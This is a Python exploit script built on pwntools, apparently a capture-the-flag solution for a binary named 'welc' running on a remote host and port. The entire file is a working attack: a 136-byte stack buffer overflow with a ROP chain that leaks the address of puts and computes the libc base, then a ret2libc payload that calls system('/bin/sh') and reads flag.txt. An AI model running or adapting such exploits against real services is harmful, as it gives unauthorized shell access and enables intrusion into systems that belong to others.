#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./welc')
libc = ELF('./libc.so.6', checksec= False)
#p = process(elf.path)
p = remote('20.216.39.14', 1237)

offset = b'A'*136

rop = ROP(elf)
rop.call(elf.plt.puts, [elf.got.puts])
rop.call(elf.sym.main)
pay = offset + rop.chain()
p.sendline(pay)

p.recvline()
resp = p.recvline().strip()
leak = u64(resp.ljust(8, b'\x00'))
log.info(f"puts Leak : {hex(leak)}")

libc.address = leak - libc.sym.puts
log.info(f"libc Address : {hex(libc.address)}")

pay = offset
pay += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
pay += p64(next(libc.search(b'/bin/sh')))
pay += p64(rop.find_gadget(['ret'])[0])
pay += p64(libc.sym.system)

p.sendline(pay)
p.sendline(b'cat flag.txt')
p.recvline()
log.success(f'FLAG => {p.recvline().decode()}')
p.close()